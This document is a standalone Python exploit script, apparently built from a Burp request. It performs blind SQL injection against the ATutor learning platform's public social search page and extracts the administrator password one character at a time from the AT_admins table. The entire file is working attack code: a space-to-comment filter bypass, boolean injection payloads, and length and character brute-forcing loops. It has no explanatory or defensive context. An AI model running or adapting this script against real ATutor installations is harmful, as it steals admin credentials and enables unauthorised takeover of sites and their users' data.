import string
import requests

def exploit(payload):
    payload = payload.replace(" ", "/**/")
    burp0_url = "http://localhost:8080/mods/_standard/social/index_public.php"
    burp0_cookies = {"_ga": "GA1.1.1420947987.1652620516", "_gid": "GA1.1.355739391.1652620516", "_gat": "1", "ATutorID": "f1098d4e74aedf09cff390d8bbb081ba"}
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://localhost:8080", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:8080/mods/_standard/social/index_public.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_data = {"search_friends_e5513b781c9eda329b9d2a78c8830adc": f"{payload}", "search": "Search", "rand_key": "e5513b781c9eda329b9d2a78c8830adc"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if ("http://localhost:8080/mods/_standard/social/sprofile.php?id=1" in r.text):
        return True
    return False

def brute_force_char(passwd):
    for character in string.printable:
        payload = f"student%%') AND '{passwd + character}'=(SELECT SUBSTRING(password,1,{len(passwd)+1}) from AT_admins WHERE login='admin')#"
        if (exploit(payload)):
            return character
    return character

def brute_force_length():
    length = 1
    while True:
        payload = f"student%%') AND '{length}'=(SELECT LENGTH(password) FROM AT_admins)#"
        if (exploit(payload)):
            return length
        else:
            length += 1
    return length

def main():

    length = brute_force_length()
    print(f"Length: {length}")

    password = ""
    for i in range(length):
        password += brute_force_char(password)
        print(f"Password: {password}")
    print(f"Password: {password}")
    

if __name__ == '__main__':
    main()

